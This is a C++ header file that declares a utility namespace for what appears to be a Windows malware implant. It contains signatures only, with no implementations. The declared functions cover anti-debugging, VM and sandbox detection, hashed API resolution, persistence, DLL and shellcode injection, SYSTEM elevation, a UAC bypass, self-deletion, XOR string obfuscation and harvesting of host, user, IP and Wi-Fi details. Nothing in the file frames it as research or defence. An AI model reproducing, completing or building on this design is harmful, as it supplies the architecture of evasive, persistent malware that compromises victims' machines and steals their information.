#pragma once
#include <windows.h>
#include <string>
#include <vector>

namespace Utils {
    // Anti-analysis
    bool IsDebuggerAttached();
    bool IsVM();
    bool IsSandbox();
    bool ShouldExit();

    // API hashing / dynamic resolution
    FARPROC GetProcAddr(HMODULE mod, const char* hash);
    HMODULE GetModule(const char* hash);

    // Persistence
    void InstallPersistence();
    void RemovePersistence();

    // Process utilities
    DWORD FindProcess(const wchar_t* name);
    HANDLE FindProcessHandle(const wchar_t* name);
    bool InjectDLL(DWORD pid, const wchar_t* dllPath);
    bool InjectShellcode(DWORD pid, const std::vector<BYTE>& shellcode);
    bool ElevateToSystem();

    // UAC bypass
    bool BypassUAC(const wchar_t* exePath);

    // File utilities
    bool WriteFileBinary(const std::string& path, const std::vector<BYTE>& data);
    std::vector<BYTE> ReadFileBinary(const std::string& path);
    bool DeleteSelf();

    // String utilities
    std::string WStringToString(const std::wstring& wstr);
    std::wstring StringToWString(const std::string& str);
    std::string GetTimestamp();
    std::string RandomString(size_t len);
    void XORString(std::string& str, char key);

    // System info
    std::string GetHostname();
    std::string GetUsername();
    std::string GetOSVersion();
    std::string GetPublicIP();
    std::string GetWifiSSID();
    DWORD GetIdleTime();

    // Execution
    bool CreateSuspendedProcess(const wchar_t* path, PROCESS_INFORMATION* pi);
    void JitterSleep(DWORD baseMs, DWORD jitterMs = 0);

    // Mutex
    bool CreateSingleton(const char* name);
}
